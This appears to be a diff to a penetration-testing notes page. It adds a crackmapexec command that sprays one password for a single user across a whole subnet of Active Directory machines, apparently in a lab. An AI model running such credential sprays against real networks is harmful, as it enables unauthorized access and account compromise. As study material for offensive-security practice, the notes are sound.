@@ -69,3 +69,10 @@ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continu
 
 * (<mark style="color:red;">Pwn3d!</mark>) = admin user&#x20;
 
+Spray creds against all domain joined machines:
+
+{% code overflow="wrap" %}
+```shell
+crackmapexec smb 192.168.241.0/24 -u pete -p 'Nexus123!' -d corp.com --continue-on-success
+```
+{% endcode %}
